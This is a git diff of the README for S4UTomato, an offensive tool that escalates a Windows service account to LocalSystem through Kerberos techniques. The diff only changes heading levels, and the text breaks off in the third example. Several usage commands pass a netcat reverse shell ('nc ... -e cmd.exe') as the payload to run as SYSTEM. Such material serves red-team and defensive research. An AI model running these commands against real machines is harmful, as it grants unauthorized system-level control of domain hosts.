@@ -1,12 +1,12 @@
-## S4UTomato
+# S4UTomato
 
 Escalate Service Account To LocalSystem via Kerberos.
 
-## Traditional Potatoes
+# Traditional Potatoes
 
 Friends familiar with the "Potato" series of privilege escalation should know that it can elevate service account privileges to local system privileges. The early exploitation techniques of "Potato" are almost identical: leveraging certain features of COM interfaces, deceiving the NT AUTHORITY\SYSTEM account to connect and authenticate to an attacker-controlled RPC server. Then, through a series of API calls, an intermediary (NTLM Relay) attack is executed during this authentication process, resulting in the generation of an access token for the NT AUTHORITY\SYSTEM account on the local system. Finally, this token is stolen, and the `CreateProcessWithToken()` or `CreateProcessAsUser()` function is used to pass the token and create a new process to obtain SYSTEM privileges.
 
-## How About Kerberos
+# How About Kerberos
 
 In any scenario where a machine is joined to a domain, you can leverage the aforementioned techniques for local privilege escalation as long as you can run code under the context of a Windows service account or a Microsoft virtual account, provided that the Active Directory hasn't been hardened to fully defend against such attacks.
 
@@ -14,7 +14,7 @@ In a Windows domain environment, SYSTEM, NT AUTHORITY\NETWORK SERVICE, and Micro
 
 Before this, we need to obtain a TGT (Ticket Granting Ticket) for the local machine account. This is not easy because of the restrictions imposed by service account permissions, preventing us from obtaining the computer's Long-term Key and thus being unable to construct a KRB_AS_REQ request. To accomplish the aforementioned goal, I leveraged three techniques: [*Resource-based Constrained Delegation*](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html), [*Shadow Credentials*](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab), and [*Tgtdeleg*](https://twitter.com/gentilkiwi/status/998219775485661184). I built my project based on the  [Rubeus](https://github.com/GhostPack/Rubeus#tgtdeleg) toolset.
 
-## How to Use and Examples
+# How to Use and Examples
 
 ```cmd
 C:\Users\whoami\Desktop>S4UTomato.exe --help
@@ -34,7 +34,7 @@ Copyright (c) 2023 whoamianony.top
   --version                 Display version information.
 ```
 
-### LEP via Resource-based Constrained Delegation
+## LEP via Resource-based Constrained Delegation
 
 ```cmd
 S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c "nc.exe 127.0.0.1 4444 -e cmd.exe"
@@ -42,7 +42,7 @@ S4UTomato.exe rbcd -m NEWCOMPUTER -p pAssw0rd -c "nc.exe 127.0.0.1 4444 -e cmd.e
 
 ![rbcd](/images/rbcd.gif)
 
-### LEP via Shadow Credentials + S4U2self
+## LEP via Shadow Credentials + S4U2self
 
 ```cmd
 S4UTomato.exe shadowcred -c "nc 127.0.0.1 4444 -e cmd.exe" -f
@@ -50,7 +50,7 @@ S4UTomato.exe shadowcred -c "nc 127.0.0.1 4444 -e cmd.exe" -f
 
 ![shadowcred](/images/shadowcred.gif)
 
-### LEP via Tgtdeleg + S4U2self
+## LEP via Tgtdeleg + S4U2self
 
 ```cmd
 # First retrieve the TGT through Tgtdeleg
